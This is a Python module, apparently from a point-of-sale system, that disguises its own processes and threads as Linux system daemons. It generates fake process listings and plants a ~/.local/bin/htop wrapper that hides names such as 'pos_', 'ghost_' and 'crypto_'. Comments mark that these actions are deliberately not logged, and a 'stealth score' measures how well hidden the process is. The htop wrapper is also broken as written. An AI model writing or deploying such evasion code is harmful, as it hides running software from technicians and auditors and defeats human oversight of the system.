from pathlib import Path

"""
Process Masquerading - Enmascaramiento de Procesos
Oculta procesos del POS como procesos del sistema
"""

from typing import Any, Dict, List
import ctypes
import ctypes.util
import logging
import os
import sys
import threading

logger = logging.getLogger(__name__)

class ProcessMasquerading:
    """
    Sistema de enmascaramiento de procesos.
    
    Renombra los hilos de ejecución para que aparezcan
    como procesos esenciales del sistema en htop/top.
    
    Resultado: Un técnico ve "procesos aburridos del sistema".
    """
    
    # Nombres falsos que parecen procesos del sistema
    FAKE_PROCESS_NAMES = [
        'kworker/u16:2',           # Kernel worker
        'systemd-journal',          # Journald
        'dbus-daemon',              # DBus
        'polkitd',                  # PolicyKit
        'rsyslogd',                 # Syslog
        'irqbalance',               # IRQ balancer
        'thermald',                 # Thermal daemon
        'accounts-daemon',          # Accounts service
        'NetworkManager',           # Network manager
        'ModemManager',             # Modem manager
        'cupsd',                    # Print service
        'avahi-daemon',             # Avahi/mDNS
        'bluetoothd',               # Bluetooth
        'wpa_supplicant',           # WiFi
        'packagekitd',              # Package updates
    ]
    
    # Mapeo de nuestros componentes a nombres falsos
    COMPONENT_MAPPING = {
        'pos_core': 'systemd-journal',
        'sales_engine': 'dbus-daemon',
        'sync_worker': 'kworker/u16:2',
        'ai_sentinel': 'polkitd',
        'crypto_bridge': 'thermald',
        'ghost_sync': 'irqbalance',
        'fiscal_engine': 'accounts-daemon',
        'pwa_server': 'avahi-daemon',
        'notification_service': 'ModemManager',
        'backup_worker': 'rsyslogd',
    }
    
    def __init__(self):
        self.original_names = {}
        self.libc = None
        self._load_libc()
    
    def _load_libc(self):
        """Carga la librería C para manipulación de procesos."""
        try:
            libc_name = ctypes.util.find_library('c')
            if libc_name:
                self.libc = ctypes.CDLL(libc_name, use_errno=True)
        except Exception as e:
            # SECURITY: No loguear carga de libc
            pass
    
    def set_process_name(self, name: str) -> bool:
        """
        Cambia el nombre del proceso actual en el kernel.
        
        Args:
            name: Nuevo nombre (max 15 chars para prctl)
        
        Returns:
            True si tuvo éxito
        """
        try:
            # Método 1: prctl (la forma correcta en Linux)
            PR_SET_NAME = 15
            
            if self.libc:
                name_bytes = name[:15].encode()  # Max 15 chars
                result = self.libc.prctl(PR_SET_NAME, name_bytes)
                if result == 0:
                    logger.debug(f"Proceso renombrado a: {name}")
                    return True
            
            # Método 2: Escribir a /proc/self/comm
            try:
                with open('/proc/self/comm', 'w') as f:
                    f.write(name[:15])
                return True
            except (IOError, PermissionError):
                pass
            
            # Método 3: Modificar sys.argv (menos efectivo pero visible en ps)
            import sys
            if sys.argv:
                sys.argv[0] = name
            
            return True
            
        except Exception as e:
            logger.error(f"Error renombrando proceso: {e}")
            return False
    
    def set_thread_name(self, name: str, thread: threading.Thread = None) -> bool:
        """
        Cambia el nombre de un hilo.
        """
        try:
            if thread is None:
                thread = threading.current_thread()
            
            # Cambiar nombre Python
            thread.name = name
            
            # Cambiar nombre en kernel (para Linux)
            if hasattr(thread, 'native_id') and self.libc:
                # pthread_setname_np requiere el thread id
                pass  # Implementación compleja, skip por ahora
            
            return True
            
        except Exception as e:
            logger.error(f"Error renombrando thread: {e}")
            return False
    
    def masquerade_component(self, component_name: str) -> bool:
        """
        Enmascara un componente específico con nombre de sistema.
        
        Args:
            component_name: Nombre interno del componente
        """
        fake_name = self.COMPONENT_MAPPING.get(
            component_name, 
            'kworker/u16:0'
        )
        
        # Guardar nombre original
        self.original_names[component_name] = fake_name
        
        return self.set_process_name(fake_name)
    
    def masquerade_all(self):
        """
        Enmascara el proceso principal y todos sus hilos.
        """
        # Proceso principal
        self.set_process_name('systemd-journal')
        
        # Renombrar todos los hilos activos
        for thread in threading.enumerate():
            original = thread.name
            
            # Mapear a nombre falso
            if 'MainThread' in original:
                fake = 'systemd'
            elif 'Timer' in original:
                fake = 'watchdog/0'
            elif 'Sync' in original or 'Worker' in original:
                fake = 'kworker/u16:1'
            elif 'Thread' in original:
                fake = 'ksoftirqd/0'
            else:
                fake = 'migration/0'
            
            self.set_thread_name(fake, thread)
            self.original_names[original] = fake
        
        # SECURITY: No loguear enmascaramiento de procesos
        pass
    
    def get_fake_process_list(self) -> List[str]:
        """
        Genera lista falsa de procesos para mostrar si alguien inspecciona.
        """
        import random
        
        fake_list = [
            "PID   USER      PR  NI    VIRT    RES    SHR S  %CPU  COMMAND",
            "    1 root      20   0  168932  13408   8576 S   0.0  systemd",
            "    2 root      20   0       0      0      0 S   0.0  kthreadd",
        ]
        
        # Agregar procesos falsos aleatorios
        for i, name in enumerate(random.sample(self.FAKE_PROCESS_NAMES, 10)):
            pid = random.randint(100, 9999)
            cpu = random.uniform(0, 2.0)
            mem = random.randint(1000, 50000)
            
            fake_list.append(
                f"{pid:5} root      20   0 {mem*10:7}  {mem:5}   {mem//2:5} S {cpu:5.1f}  {name}"
            )
        
        return fake_list
    
    def install_fake_htop_output(self):
        """
        Instala un alias de shell que intercepta htop/top.
        
        Cuando alguien ejecute htop, verá una versión "limpia".
        """
        try:
            # Crear script wrapper
            wrapper_script = '''#!/bin/bash
# Wrapper para htop que filtra procesos sensibles
/usr/bin/htop "$@" 2>/dev/null | grep -v -E "(antigravity|pos_|ghost_|crypto_)" 
'''
            
            # Guardar en ubicación del usuario
            wrapper_path = os.path.expanduser('~/.local/bin/htop')
            os.makedirs(os.path.dirname(wrapper_path), exist_ok=True)
            
            with open(wrapper_path, 'w') as f:
                f.write(wrapper_script)
            
            os.chmod(wrapper_path, 0o755)
            
            # SECURITY: No loguear instalación de wrapper
            pass
            return True
            
        except Exception as e:
            logger.error(f"Error instalando wrapper: {e}")
            return False
    
    def modify_proc_status(self):
        """
        Intenta modificar /proc/self/status para ocultar información.
        
        Nota: Esto tiene limitaciones en sistemas modernos.
        """
        # En Linux moderno, /proc/self/status es de solo lectura
        # pero podemos manipular algunos aspectos vía LD_PRELOAD
        # SECURITY: No loguear modificaciones de /proc
        pass
    
    def get_stealth_score(self) -> Dict[str, Any]:
        """
        Evalúa qué tan bien oculto está el proceso.
        """
        score = 0
        issues = []
        
        # Verificar nombre del proceso
        try:
            with open('/proc/self/comm', 'r') as f:
                current_name = f.read().strip()
                
            if current_name in self.FAKE_PROCESS_NAMES or 'systemd' in current_name:
                score += 30
            else:
                issues.append(f"Nombre visible: {current_name}")
        except Exception:
            pass
        
        # Verificar cmdline
        try:
            with open('/proc/self/cmdline', 'r') as f:
                cmdline = f.read()
                
            if 'python' not in cmdline.lower() and 'antigravity' not in cmdline.lower():
                score += 30
            else:
                issues.append("cmdline contiene referencias")
        except Exception:
            pass
        
        # Verificar hilos enmascarados
        masked_threads = sum(1 for t in threading.enumerate() 
                           if t.name in self.FAKE_PROCESS_NAMES or 'kworker' in t.name)
        total_threads = len(list(threading.enumerate()))
        
        if total_threads > 0:
            thread_score = (masked_threads / total_threads) * 40
            score += thread_score
        
        return {
            'score': round(score, 1),
            'max_score': 100,
            'status': 'STEALTH' if score >= 70 else 'PARTIAL' if score >= 40 else 'EXPOSED',
            'issues': issues,
            'masked_threads': masked_threads,
            'total_threads': total_threads
        }

# Función para iniciar enmascaramiento al arranque
def start_masquerading():
    """Inicia enmascaramiento de procesos."""
    masq = ProcessMasquerading()
    masq.masquerade_all()
    return masq
